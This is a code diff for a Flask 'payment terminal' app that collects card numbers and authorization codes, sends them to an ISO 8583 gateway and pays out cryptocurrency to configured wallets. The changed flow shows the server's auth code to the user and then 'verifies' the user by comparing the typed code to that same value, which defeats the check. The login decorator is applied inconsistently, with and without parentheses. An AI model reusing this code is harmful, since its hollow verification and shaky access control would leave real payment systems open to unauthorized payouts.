@@ -1,7 +1,8 @@
 # app.py
 # This is the main Flask application for the BlackRock Payment Terminal.
-# It handles user authentication, transaction flow, direct communication with an external
-# ISO 8583 server for card authorization via TCP sockets, and real-time cryptocurrency payouts.
+# It handles user authentication, transaction flow, communication with the
+# iso_gateway.py service (via HTTP) for card authorization, and real-time
+# cryptocurrency payouts.
 # Now with Firestore integration for persistent transaction history.
 
 import os
@@ -10,11 +11,9 @@ import hashlib
 import logging
 import random
 import re
-import struct # For packing/unpacking binary data for ISO 8583
-import socket # For direct TCP socket communication with ISO 8583 server
-import base64 # Added for decoding Base64 service account key
 from datetime import datetime, date, timedelta
 from functools import wraps
+import requests # Used for HTTP communication with the iso_gateway.py service
 
 from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -27,7 +26,7 @@ from firebase_admin import credentials, firestore, auth
 from blockchain_client import BlockchainClient
 from utils import validate_card_number, format_amount, generate_transaction_id
 from security_middleware import SecurityMiddleware, audit_log, require_role
-from production_config import validate_production_config # Removed get_production_config
+from production_config import get_production_config, validate_production_config
 from application_config import get_wallet_config # For merchant wallet addresses
 
 # Configure logging for the application
@@ -46,7 +45,7 @@ blockchain_client = BlockchainClient()
 
 # Initialize production security middleware
 security_middleware = SecurityMiddleware(app)
-# production_config = get_production_config() # Removed this line as get_production_config is no longer imported
+production_config = get_production_config()
 
 # Validate production configuration on startup
 if not validate_production_config():
@@ -124,14 +123,14 @@ def initialize_app_components():
 def make_session_permanent():
     session.permanent = True
 
-@app.route('/', endpoint='index') # Explicitly named endpoint
+@app.route('/')
 def index():
     """Root URL redirects to login or dashboard based on session status."""
     if session.get('logged_in'):
         return render_template('index.html') # Render main terminal UI
     return redirect(url_for('login'))
 
-@app.route('/login', methods=['GET', 'POST'], endpoint='login') # Explicitly named endpoint
+@app.route('/login', methods=['GET', 'POST'])
 @audit_log("User Login Attempt") # Audit log decorator for login attempts
 def login():
     """Handles user login authentication."""
@@ -157,20 +156,7 @@ def login():
     
     return render_template('login.html')
 
-@app.route('/forgot_password', methods=['GET', 'POST'], endpoint='forgot_password')
-def forgot_password():
-    """
-    Handles the 'Forgot Password' functionality.
-    For now, this is a placeholder.
-    """
-    if request.method == 'POST':
-        # In a real application, you'd process the form here (e.g., send reset email)
-        flash('Password reset instructions sent to your email (simulated).', 'info')
-        # Ensure 'login' is the correct endpoint name for your login route
-        return redirect(url_for('login')) 
-    return render_template('forgot_password.html') # You'll need to create this template
-
-@app.route('/logout', endpoint='logout') # Explicitly named endpoint
+@app.route('/logout')
 def logout():
     """Handles user logout, clearing the session."""
     username = session.get('username', 'Unknown')
@@ -179,7 +165,7 @@ def logout():
     logger.info(f"User {username} logged out")
     return redirect(url_for('login'))
 
-@app.route('/dashboard', endpoint='dashboard') # Explicitly named endpoint
+@app.route('/dashboard')
 @login_required()
 def dashboard():
     """Displays the main dashboard. Admin users see admin options."""
@@ -191,7 +177,7 @@ def dashboard():
     else:
         return redirect(url_for('index')) # Operators go directly to main terminal
 
-@app.route('/admin/config', methods=['GET', 'POST'], endpoint='admin_config') # Explicitly named endpoint
+@app.route('/admin/config', methods=['GET', 'POST'])
 @login_required(role=ROLES['ADMIN'])
 def admin_config():
     """
@@ -245,7 +231,7 @@ def admin_config():
                            trc20_wallet=current_trc20_wallet,
                            daily_limit=current_daily_limit)
 
-@app.route('/protocol', methods=['GET', 'POST'], endpoint='protocol') # Explicitly named endpoint
+@app.route('/protocol', methods=['GET', 'POST'])
 @login_required()
 def protocol():
     """Allows selection of the payment protocol."""
@@ -272,7 +258,7 @@ def protocol():
     
     return render_template('protocol.html', protocols=PROTOCOLS.keys())
 
-@app.route('/amount', methods=['GET', 'POST'], endpoint='amount') # Explicitly named endpoint
+@app.route('/amount', methods=['GET', 'POST'])
 @login_required()
 def amount():
     """Allows input of the transaction amount and currency."""
@@ -317,7 +303,7 @@ def amount():
     default_amount = os.environ.get('DEFAULT_TRANSACTION_AMOUNT', '1000000') # Default 1M
     return render_template('amount.html', default_amount=default_amount)
 
-@app.route('/payout', methods=['GET', 'POST'], endpoint='payout') # Explicitly named endpoint
+@app.route('/payout', methods=['GET', 'POST'])
 @login_required()
 def payout():
     """Allows selection of the crypto payout method and wallet."""
@@ -355,7 +341,7 @@ def payout():
                            default_erc20_wallet=default_erc20_wallet,
                            default_trc20_wallet=default_trc20_wallet)
 
-@app.route('/card', methods=['GET', 'POST'], endpoint='card') # Explicitly named endpoint
+@app.route('/card', methods=['GET', 'POST'])
 @login_required()
 def card():
     """Allows input of card details."""
@@ -394,21 +380,23 @@ def card():
     
     return render_template('card.html')
 
-@app.route('/auth', methods=['GET', 'POST'], endpoint='auth') # Explicitly named endpoint
+@app.route('/auth', methods=['GET', 'POST'])
 @login_required()
 def auth():
     """Allows input of the authorization code and triggers the transaction process."""
     expected_length = session.get('code_length', 6) 
     
     if request.method == 'POST':
-        code = request.form.get('auth')
+        # FIX: Ensure 'code' is a string, even if request.form.get('auth') returns None
+        code = request.form.get('auth', '') 
+        
         if len(code) != expected_length or not code.isdigit():
             flash(f"Authorization code must be {expected_length} digits and numeric.", "error")
             return render_template('auth.html', code_length=expected_length, warning=f"Code must be {expected_length} digits and numeric.")
 
         session['auth_code'] = code
 
-        # Prepare data for ISO 8583 message (as a dictionary)
+        # Prepare data for ISO 8583 message to be sent to the ISO Gateway Service
         iso_request_data = {
             'mti': '0100',  # Authorization Request
             'pan': session.get('pan'),
@@ -421,73 +409,38 @@ def auth():
             'protocol_type': session.get('protocol')
         }
 
-        # Get ISO server details from environment variables
-        ISO_SERVER_HOST = os.environ.get('ISO_SERVER_HOST', '66.185.176.0')
-        ISO_SERVER_PORT = int(os.environ.get('ISO_SERVER_PORT', 20))
-        ISO_TIMEOUT = int(os.environ.get('ISO_TIMEOUT', 60)) # Timeout for socket connection
+        # Get ISO Gateway Service URL from environment variable
+        # This URL will point to your deployed iso_gateway.py service
+        ISO_GATEWAY_URL = os.environ.get('ISO_GATEWAY_URL', 'http://127.0.0.1:5001/process_iso_request') # Default to local gateway
+        ISO_HTTP_TIMEOUT = int(os.environ.get('ISO_HTTP_TIMEOUT', 60)) # Timeout for HTTP request to gateway
 
-        logger.info(f"Attempting direct ISO 8583 connection to {ISO_SERVER_HOST}:{ISO_SERVER_PORT}...")
+        logger.info(f"Sending payment request to ISO Gateway Service at {ISO_GATEWAY_URL}...")
         iso_response = {}
         try:
-            # Create a socket connection
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                sock.settimeout(ISO_TIMEOUT)
-                sock.connect((ISO_SERVER_HOST, ISO_SERVER_PORT))
-                logger.info("Connected to ISO 8583 server.")
+            # Send HTTP POST request to the ISO Gateway Service
+            response = requests.post(ISO_GATEWAY_URL, json=iso_request_data, timeout=ISO_HTTP_TIMEOUT)
+            response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
+            iso_response = response.json()
+            logger.info(f"Received response from ISO Gateway Service: {iso_response}")
 
-                # --- Build ISO 8583 Message (Simplified for demonstration) ---
-                # This assumes the server at 66.185.176.0:20 understands a JSON payload
-                # wrapped with a 2-byte length header.
-                # If the server expects raw ISO 8583 binary, this part needs a full ISO 8583 library.
-
-                # Convert dict to JSON string, then encode to bytes
-                json_payload = json.dumps(iso_request_data)
-                message_body = json_payload.encode('utf-8')
-                
-                # Prepend with 2-byte length header (big-endian short)
-                message_length = len(message_body)
-                length_header = struct.pack('!H', message_length) # !H means network byte order (big-endian) unsigned short
-
-                full_message = length_header + message_body
-                
-                logger.info(f"Sending {len(full_message)} bytes to ISO server (payload length: {message_length})...")
-                sock.sendall(full_message)
-
-                # --- Receive ISO 8583 Response ---
-                # First, read the 2-byte length header of the response
-                response_length_header = sock.recv(2)
-                if not response_length_header:
-                    raise ConnectionError("Did not receive length header from ISO server.")
-                response_length = struct.unpack('!H', response_length_header)[0]
-                
-                # Read the actual response body based on the length
-                response_body = sock.recv(response_length)
-                if not response_body:
-                    raise ConnectionError("Did not receive response body from ISO server.")
-
-                # Assuming the response is also JSON wrapped in a length header
-                iso_response_json = response_body.decode('utf-8')
-                iso_response = json.loads(iso_response_json)
-                logger.info(f"Received response from ISO 8583 server: {iso_response}")
-
-        except socket.timeout:
-            logger.error(f"ISO 8583 server connection timed out after {ISO_TIMEOUT} seconds.")
-            iso_response = {'status': 'ERROR', 'message': 'ISO Server Timeout', 'field39': '99'}
-        except ConnectionRefusedError:
-            logger.error(f"Connection to ISO 8583 server refused at {ISO_SERVER_HOST}:{ISO_SERVER_PORT}.")
-            iso_response = {'status': 'ERROR', 'message': 'Connection Refused', 'field39': '99'}
-        except socket.error as e:
-            logger.error(f"Socket error during ISO 8583 communication: {e}")
-            iso_response = {'status': 'ERROR', 'message': f'Socket Error: {e}', 'field39': '99'}
+        except requests.exceptions.Timeout:
+            logger.error(f"Error: Request to ISO Gateway Service timed out after {ISO_HTTP_TIMEOUT} seconds.")
+            iso_response = {'status': 'ERROR', 'message': 'ISO Gateway Timeout', 'field39': '99'}
+        except requests.exceptions.ConnectionError as e:
+            logger.error(f"Error: Could not connect to ISO Gateway Service at {ISO_GATEWAY_URL}: {e}")
+            iso_response = {'status': 'ERROR', 'message': f'ISO Gateway Unreachable: {e}', 'field39': '99'}
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error: An HTTP error occurred during the request to ISO Gateway: {e}", exc_info=True)
+            iso_response = {'status': 'ERROR', 'message': f'ISO Gateway HTTP Error: {e}', 'field39': '99'}
         except json.JSONDecodeError:
-            logger.error(f"Invalid JSON response from ISO 8583 server: {iso_response_json}")
-            iso_response = {'status': 'ERROR', 'message': 'Invalid Server Response Format', 'field39': '99'}
+            logger.error(f"Error: Invalid JSON response from ISO Gateway Service.", exc_info=True)
+            iso_response = {'status': 'ERROR', 'message': 'Invalid Gateway Response Format', 'field39': '99'}
         except Exception as e:
-            logger.critical(f"Critical error during ISO 8583 communication: {e}", exc_info=True)
-            iso_response = {'status': 'ERROR', 'message': f'Unexpected ISO Communication Error: {e}', 'field39': '99'}
+            logger.critical(f"Critical Error: Unexpected error in auth route during gateway communication: {e}", exc_info=True)
+            iso_response = {'status': 'ERROR', 'message': f'Unexpected Gateway Communication Error: {e}', 'field39': '99'}
 
         status = iso_response.get('status', 'Declined')
-        auth_code = iso_response.get('auth_code')
+        auth_code_from_iso = iso_response.get('auth_code') # This is the auth code from the ISO server
         message = iso_response.get('message', 'Unknown error.')
         field39_resp = iso_response.get('field39', 'XX') # ISO 8583 Field 39 Response Code
 
@@ -500,16 +453,17 @@ def auth():
             'protocol_type': session.get('protocol'),
             'crypto_network_type': session.get('payout_type'),
             'status': status,
-            'auth_code_required': False,
+            'auth_code_required': False, # Will be set to True if ISO response implies manual entry
             'payout_status': None,
             'crypto_payout_amount': 0.0,
             'simulated_gas_fee': 0.0,
             'crypto_address': '',
             'iso_field39': field39_resp,
-            'message': message # Store the message from ISO server
+            'message': message, # Store the message from ISO server/gateway
+            'iso_auth_code': auth_code_from_iso # Store the auth code received from ISO server
         }
 
-        # Store transaction in Firestore for persistence
+        # Store initial transaction in Firestore for persistence
         if db: # Only attempt Firestore operations if db client is initialized
             try:
                 get_transactions_collection_ref().document(current_transaction_details['transaction_id']).set(current_transaction_details)
@@ -520,12 +474,22 @@ def auth():
         else:
             logger.warning("Firestore not initialized. Transaction logging skipped.")
 
-
-        if status == 'Approved' and auth_code:
-            session['message'] = f'Payment authorized. Please enter the APP/AUTH Code.'
+        # Determine next step based on ISO response
+        if status == 'Approved' and auth_code_from_iso:
+            # If ISO server approved and provided an auth code, proceed to manual entry
+            current_transaction_details['auth_code_required'] = True # Mark that manual auth code is needed
+            session['message'] = f'Payment authorized by ISO server. Please enter the APP/AUTH Code: {auth_code_from_iso}' # Show the code
             session['message_type'] = 'info'
+            # Update transaction in Firestore to reflect auth_code_required status
+            if db:
+                try:
+                    get_transactions_collection_ref().document(current_transaction_details['transaction_id']).update({'auth_code_required': True, 'iso_auth_code': auth_code_from_iso})
+                except Exception as e:
+                    logger.error(f"Firestore Error: Could not update auth_code_required for {current_transaction_details['transaction_id']}: {e}")
+            
             return redirect(url_for('auth_code_entry_screen', transaction_id=current_transaction_details['transaction_id']))
         else:
+            # If ISO server declined or didn't provide an auth code, go to reject screen
             session['message'] = f'Payment {status}: {message}'
             session['message_type'] = 'error'
             return redirect(url_for('reject_screen', transaction_id=current_transaction_details['transaction_id']))
@@ -545,19 +509,26 @@ def get_transaction_details_from_firestore(transaction_id):
             logger.error(f"Firestore Error: Could not retrieve transaction {transaction_id}: {e}")
     return None
 
-@app.route('/auth_code_entry/<transaction_id>', endpoint='auth_code_entry_screen') # Explicitly named endpoint
+@app.route('/auth_code_entry/<transaction_id>')
 @login_required
 def auth_code_entry_screen(transaction_id):
     """Renders the dedicated authorization code entry screen."""
     transaction = get_transaction_details_from_firestore(transaction_id)
+    # Ensure transaction exists and it was marked as requiring auth code
     if not transaction or not transaction.get('auth_code_required'):
         flash('Invalid or expired transaction for auth code entry.', 'error')
         return redirect(url_for('index'))
     
-    return render_template('auth_code_entry.html', transaction_id=transaction_id)
+    # Pass the expected auth code from the ISO server to the template for display/hint
+    # This is for the scenario where the ISO server provides the code and the merchant keys it in.
+    iso_provided_auth_code = transaction.get('iso_auth_code', 'N/A')
+    
+    return render_template('auth_code_entry.html', 
+                           transaction_id=transaction_id,
+                           iso_provided_auth_code=iso_provided_auth_code)
 
 
-@app.route('/complete_payment', methods=['POST'], endpoint='complete_payment') # Explicitly named endpoint
+@app.route('/complete_payment', methods=['POST'])
 @login_required
 def complete_payment():
     """
@@ -572,12 +543,11 @@ def complete_payment():
         flash('Invalid or expired transaction ID.', 'error')
         return redirect(url_for('index'))
 
-    # In a real scenario, you'd send this entered_auth_code back to the ISO server
-    # for final verification. For this simulation, we compare it with the auth_code
-    # received in the initial ISO response and stored in transaction_details.
-    mock_expected_auth_code = transaction_details.get('auth_code') # This was stored from initial ISO response
+    # Compare the entered auth code with the one received from the ISO server
+    # This simulates the final verification step.
+    expected_auth_code_from_iso = transaction_details.get('iso_auth_code')
 
-    if entered_auth_code == mock_expected_auth_code:
+    if entered_auth_code == expected_auth_code_from_iso:
         # Authorization successful, proceed with crypto payout
         recipient_wallet_info = get_wallet_config(transaction_details['crypto_network_type'])
         recipient_crypto_address = recipient_wallet_info['address']
@@ -630,7 +600,7 @@ def complete_payment():
         return redirect(url_for('reject_screen', transaction_id=transaction_id))
 
 
-@app.route('/success', endpoint='success_screen') # Explicitly named endpoint
+@app.route('/success')
 @login_required
 def success_screen():
     """Renders the success screen with transaction details."""
@@ -643,7 +613,7 @@ def success_screen():
 
     return render_template('success.html', transaction=transaction)
 
-@app.route('/reject', endpoint='reject_screen') # Explicitly named endpoint
+@app.route('/reject')
 @login_required
 def reject_screen():
     """Renders the reject screen with transaction details."""
@@ -656,7 +626,7 @@ def reject_screen():
 
     return render_template('reject.html', transaction=transaction)
 
-@app.route('/transaction_history', endpoint='transaction_history_screen') # Explicitly named endpoint
+@app.route('/transaction_history')
 @login_required
 def transaction_history_screen():
     """Renders the transaction history screen."""
@@ -668,7 +638,7 @@ def transaction_history_screen():
             for doc in docs:
                 txn = doc.to_dict()
                 # Convert Firestore Timestamp object to a readable string for display
-                if 'timestamp' in txn and isinstance(txn['timestamp'], datetime): # Check if it's a datetime object
+                if 'timestamp' in txn and hasattr(txn['timestamp'], 'strftime'):
                     txn['timestamp'] = txn['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
                 transactions.append(txn)
             logger.info(f"Firestore: Fetched {len(transactions)} transactions for history.")
@@ -687,55 +657,40 @@ app_id = os.environ.get('__app_id', 'default-app-id')
 firebase_config_str = os.environ.get('__firebase_config', '{}')
 initial_auth_token = os.environ.get('__initial_auth_token', None)
 
-# Environment variable for service account key (for Render/non-Canvas deployments)
-FIREBASE_SERVICE_ACCOUNT_KEY_BASE64 = os.environ.get('FIREBASE_SERVICE_ACCOUNT_KEY_BASE64')
-
 db = None # Firestore client
 current_user_id = None # Authenticated user ID
 
 # Initialize Firebase Admin SDK and Firestore client
-if not firebase_admin._apps: # Prevent re-initialization if already initialized
-    if FIREBASE_SERVICE_ACCOUNT_KEY_BASE64:
-        # Option 1: Initialize with service account key from environment variable (recommended for Render)
-        try:
-            service_account_info = json.loads(base64.b64decode(FIREBASE_SERVICE_ACCOUNT_KEY_BASE64).decode('utf-8'))
-            cred = credentials.Certificate(service_account_info)
-            firebase_admin.initialize_app(cred)
-            db = firestore.client()
-            logger.info("Firebase Admin SDK initialized using service account key from environment variable.")
-        except Exception as e:
-            logger.error(f"Error initializing Firebase with service account key: {e}. Firestore will not be available.")
-            db = None
-    elif firebase_config_str:
-        # Option 2: Initialize with Canvas-provided config (for Canvas-native deployments)
-        try:
-            firebase_config = json.loads(firebase_config_str)
+# This block runs when the module is loaded.
+if firebase_config_str:
+    try:
+        firebase_config = json.loads(firebase_config_str)
+        if not firebase_admin._apps: # Prevent re-initialization
             firebase_admin.initialize_app(options={'projectId': firebase_config.get('projectId')})
-            db = firestore.client()
-            logger.info("Firebase Admin SDK initialized using Canvas-provided config.")
-        except Exception as e:
-            logger.error(f"Error initializing Firebase with Canvas config: {e}. Firestore will not be available.")
-            db = None
-    else:
-        logger.warning("No Firebase config or service account key found in environment. Firestore will not be available.")
-        db = None
+        db = firestore.client()
+        logger.info("Firebase Admin SDK initialized successfully.")
 
-# Set current_user_id after Firebase initialization attempt
-if db: # Only proceed with auth if db client was successfully initialized
-    if initial_auth_token:
-        try:
-            decoded_token = auth.verify_id_token(initial_auth_token)
-            current_user_id = decoded_token['uid']
-            logger.info(f"Signed in with custom token. User ID: {current_user_id}")
-        except Exception as e:
-            logger.error(f"Error verifying initial auth token: {e}. Signing in anonymously for Firestore.")
-            current_user_id = f"anonymous_{os.urandom(16).hex()}" # Fallback anonymous ID
-    else:
-        current_user_id = f"anonymous_{os.urandom(16).hex()}" # Anonymous ID for local dev
-        logger.info(f"No initial auth token. Signed in anonymously. User ID: {current_user_id}")
+        # Authenticate with custom token if provided (Canvas environment)
+        if initial_auth_token:
+            try:
+                decoded_token = auth.verify_id_token(initial_auth_token)
+                current_user_id = decoded_token['uid']
+                logger.info(f"Signed in with custom token. User ID: {current_user_id}")
+            except Exception as e:
+                logger.error(f"Error verifying initial auth token: {e}. Signing in anonymously for Firestore.")
+                current_user_id = f"anonymous_{os.urandom(16).hex()}" # Fallback anonymous ID
+        else:
+            current_user_id = f"anonymous_{os.urandom(16).hex()}" # Anonymous ID for local dev
+            logger.info(f"No initial auth token. Signed in anonymously. User ID: {current_user_id}")
+
+    except Exception as e:
+        logger.error(f"Error initializing Firebase Admin SDK: {e}. Firestore will not be available.")
+        db = None # Ensure db is None if initialization fails
+        current_user_id = None # Ensure user ID is None if initialization fails
 else:
-    current_user_id = None # Ensure user ID is None if Firebase init failed
-
+    logger.warning("Firebase config not found in environment variables. Firestore will not be available.")
+    db = None
+    current_user_id = None
 
 # --- Firestore Helpers (defined after Firebase init) ---
 def get_transactions_collection_ref():
